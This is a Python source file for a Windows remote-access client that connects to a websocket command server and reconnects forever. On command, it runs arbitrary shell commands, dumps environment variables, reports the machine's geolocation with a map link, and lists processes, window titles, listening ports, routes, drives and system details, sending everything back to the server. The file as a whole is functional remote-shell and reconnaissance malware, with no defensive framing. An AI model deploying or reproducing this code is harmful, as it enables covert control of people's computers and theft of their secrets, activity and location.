import asyncio
import ctypes
import json
import os
import platform
import subprocess
import time
import urllib.request
from datetime import datetime
from subprocess import STDOUT, check_output

import chardet
import websockets
from pprint import pprint


user32 = ctypes.WinDLL('user32')
kernel32 = ctypes.WinDLL('kernel32')

def force_decode(string, codecs=['utf8', 'cp1252', 'ASCII']):
    for i in codecs:
        try:
            return string.decode(i)
        except:
            pass


async def test():
    print("Start Test")
    try:
        print("Trying to connect...")
        #async with websockets.connect('ws://10.0.0.234:8000') as websocket:
        async with websockets.connect('ws://127.0.0.1:8000') as websocket:
            timestamp = str(datetime.now())
            print(f"Sending hello timestamp {timestamp}")
            await websocket.send(timestamp)

            # Receive Configuration
            try:
                config_store_json = await websocket.recv()
            except:
                return
            config_store=json.loads(config_store_json)
            pprint(config_store)
            for k in config_store:
                print(f'{k}: {config_store[k]}')

            while True:
                command_json = await websocket.recv()

                command = json.loads(command_json)
                request = command[0]
                args = command[1]

                print(f"Command to execute: {request}")
                print(f"Command to execute: {str(args)}")

                status = "OK"
                output = []

                if request == 'SHELL':
                    # Send command and arguments to shell
                    try:
                        ret = check_output(args, stderr=STDOUT, timeout=5, shell=True)
                        the_encoding = chardet.detect(ret)['encoding']
                        output.append(ret.decode(the_encoding, 'ignore'))
                    except subprocess.CalledProcessError as e:
                        status = "WARNING"
                        output.append(str(e.returncode))
                        the_encoding = chardet.detect(e.output)['encoding']
                        output.append(str(e.output.decode(the_encoding, 'ignore')))
                    except Exception as e:
                        status = "ERROR"
                        output.append(str("-1"))
                        output.append(str(e))
                elif request == "GET_TIME":
                    # Get local time at client
                    try:
                        now = datetime.now()  # current date and time
                        output.append(now.strftime("%A %d.%G.%d %H:%M:%S"))
                    except Exception as e:
                        status = "ERROR"
                        output.append(str("-1"))
                        output.append(str(e))

                elif request == "GET_MONITORS":
                    # get number of used monitors
                    try:
                        p = await subprocess.check_output(["powershell.exe",
                                                     "Get-CimInstance -Namespace root\wmi -ClassName WmiMonitorBasicDisplayParams"],
                                                    encoding='utf-8', timeout=5)
                        output.append(p)
                    except Exception as e:
                        status = "ERROR"
                        output.append(str("-1"))
                        output.append(str(e))

                elif request == "GET_LOCATION":
                    # Get geolocation and
                    try:
                        # with urllib.request.urlopen("https://geolocation-db.com/json") as url:

                        with urllib.request.urlopen("http://ip-api.com/json/") as url:
                            data = json.loads(url.read().decode())

                        for key in data:
                            output.append(f"{key}: {data[key]}")
                        output.append(f"http://www.google.com/maps/place/{data['lat']},{data['lon']}")
                    except Exception as e:
                        status = "ERROR"
                        output.append(str("-1"))
                        output.append(str(e))
                elif request == "GET_CPU":
                    # get number of used monitors
                    try:
                        count = os.cpu_count()
                        output.append(f'Number of CPUs: {count}')
                    except Exception as e:
                        status = "ERROR"
                        output.append(str("-1"))
                        output.append(str(e))
                elif request == "GET_PID":
                    # get current PID
                    try:
                        count = os.getpid()
                        output.append(f'Current PID: {count}')
                    except Exception as e:
                        status = "ERROR"
                        output.append(str("-1"))
                        output.append(str(e))
                elif request == "GET_LOGIN":
                    # get current user
                    try:
                        count = os.getlogin()
                        output.append(f'Current Login: {count}')
                    except Exception as e:
                        status = "ERROR"
                        output.append(str("-1"))
                        output.append(str(e))
                elif request == "GET_ENV":
                    # get ENVIRONMENT
                    try:
                        for k in os.environ:
                            output.append(f'{k} {os.getenv(k)}')
                    except Exception as e:
                        status = "ERROR"
                        output.append(str("-1"))
                        output.append(str(e))
                elif request == "GET_NETSTAT":
                    # get number of used monitors
                    try:
                        p = subprocess.check_output(["powershell.exe", "Get-NetTCPConnection -State Listen"],
                                                    encoding='utf-8', timeout=5)
                        output.append(p)
                    except Exception as e:
                        status = "ERROR"
                        output.append(str("-1"))
                        output.append(str(e))
                elif request == "GET_ROUTING":
                    # get number of used monitors
                    try:
                        ret = check_output(["netstat", "-nr"], stderr=STDOUT, timeout=5, shell=True)
                        the_encoding = chardet.detect(ret)['encoding']
                        output.append(ret.decode(the_encoding, 'ignore'))
                    except Exception as e:
                        status = "ERROR"
                        output.append(str("-1"))
                        output.append(str(e))
                elif request == "GET_TASKS":
                    # List all tasks
                    try:
                        p = subprocess.check_output(["powershell.exe", "Get-Process"],
                                                    encoding='utf-8', timeout=5)
                        output.append(p)
                    except Exception as e:
                        status = "ERROR"
                        output.append(str("-1"))
                        output.append(str(e))
                elif request == "GET_WINDOWS":
                    # get number of used monitors
                    try:
                        p = subprocess.check_output(["powershell.exe",
                                                     "Get-Process | Where-Object {$_.mainWindowTitle} | Format-Table Id, Name, mainWindowtitle -AutoSize"],
                                                    encoding='utf-8', timeout=5)
                        output.append(p)
                    except Exception as e:
                        status = "ERROR"
                        output.append(str("-1"))
                        output.append(str(e))

                elif request == 'GET_DRIVES':
                    # list all availible drive letters
                    try:
                        drives = []
                        bitmask = kernel32.GetLogicalDrives()
                        letter = ord('A')
                        while bitmask > 0:
                            if bitmask & 1:
                                output.append(chr(letter) + ':\\')
                            bitmask >>= 1
                            letter += 1
                    except Exception as e:
                        status = "ERROR"
                        output.append(str("-1"))
                        output.append(str(e))
                elif request == "CD":
                    # Get geolocation and
                    try:
                        # try:
                        os.chdir(args[0])
                        # except:
                        #    pass
                        output.append(os.getcwd())
                    except Exception as e:
                        status = "ERROR"
                        output.append(str("-1"))
                        output.append(str(e))

                elif request == 'SYSINFO':
                    output.append(f'''System: {platform.platform()} {platform.win32_edition()}''')
                    output.append(f'''Architecture: {platform.architecture()}''')
                    output.append(f'''Name of Computer: {platform.node()}''')
                    output.append(f'''Processor: {platform.processor()}''')
                    output.append(f'''Python: {platform.python_version()}''')
                    output.append(f'''Java: {platform.java_ver()}''')
                    output.append(f'''User: {os.getlogin()}''')
                elif request == 'EXIT':
                    exit(1)
                else:
                    request = f"Internal Error: Unknown command {request}"

                # pprint(output)
                # print(type(output))
                answer = []
                answer.append(status)
                answer.append(output)
                answer_json = json.dumps(answer)
                # print(f'Command: {answer_json}')
                # pprint(answer_json)
                await websocket.send(answer_json)
                print("End of Command, waiting for next command")
    except Exception as e:
        print(f'Exception: {e}')

while True:
    asyncio.get_event_loop().run_until_complete(test())
